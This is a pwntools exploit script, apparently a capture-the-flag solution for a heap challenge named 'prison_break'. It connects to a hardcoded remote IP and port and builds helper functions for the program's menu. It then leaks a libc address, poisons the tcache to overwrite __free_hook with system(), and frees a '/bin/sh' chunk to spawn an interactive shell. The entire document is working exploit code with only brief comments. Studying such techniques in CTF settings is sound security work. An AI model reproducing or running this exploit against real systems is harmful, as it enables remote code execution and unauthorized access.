from pwn import *

# Set up context and load binary and libc
context.binary = binary = ELF("./prison_break")
libc = ELF("./glibc/libc.so.6")

# Connect to remote service
p = remote("94.237.55.96", 35661)

# ----------------- Helper Functions -----------------

def alloc(i, size, data=b'aaa'):
    """
    Allocate a chunk.

    :param i: Index to allocate at.
    :param size: Size of the chunk.
    :param data: Optional data to write into the chunk.
    """
    p.sendlineafter(b'# ', b'1')  # Choose allocate
    p.sendlineafter(b':', str(i).encode())  # Send index
    p.sendlineafter(b':', str(size).encode())  # Send size
    p.sendlineafter(b':', data)  # Send data

def delete(i):
    """
    Free a chunk at a given index.

    :param i: Index to free.
    """
    p.sendlineafter(b'# ', b'2')  # Choose delete
    p.sendlineafter(b':', str(i).encode())  # Send index

def view(i):
    """
    View contents of a chunk.

    :param i: Index to view.
    :return: Bytes read from the chunk.
    """
    p.sendlineafter(b'# ', b'3')  # Choose view
    p.sendlineafter(b':', str(i).encode())  # Send index
    p.recvuntil(b':\n')  # Wait for output
    return p.recvline()  # Return content

def copy(copy_idx, paste_idx):
    """
    Copy contents of one chunk to another.

    :param copy_idx: Source index.
    :param paste_idx: Destination index.
    """
    p.sendlineafter(b'# ', b'4')  # Choose copy
    p.sendlineafter(b':', str(copy_idx).encode())  # Send source
    p.sendlineafter(b':', str(paste_idx).encode())  # Send destination

# ----------------- Exploit Starts Here -----------------

# Fill up the tcache bin with freed chunks (double-free setup)
for i in range(10):
    alloc(i, 0x80)

# Free chunks 1 through 8 to populate tcache
for i in range(1, 9):
    delete(i)

# Copy chunk 8 to chunk 0, leaking a libc pointer through the freed chunk
copy(8, 0)

# Parse leaked libc address and calculate base address
libc_leak = u64(view(0)[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ebca0
log.success(f"Libc base: {hex(libc.address)}")

# Overwrite tcache freelist entry to point near __free_hook
__free_hook = libc.sym.__free_hook
alloc(1, 0x70, data=p64(__free_hook - 0xb))  # Adjusted to align with system()

# Trick tcache to return a chunk overlapping __free_hook
copy(1, 7)

# Allocate and write a fake chunk that overlaps __free_hook
alloc(2, 0x80)
alloc(3, 0x80, data=b'A' * 0xb + p64(libc.sym.system))  # Overwrite __free_hook with system()

# Allocate a chunk containing "/bin/sh" string and trigger __free_hook by freeing it
alloc(4, 0x80, data=b'/bin/sh\0')
delete(4)  # Triggers system("/bin/sh")

# Pass control to the user for shell interaction
p.interactive()
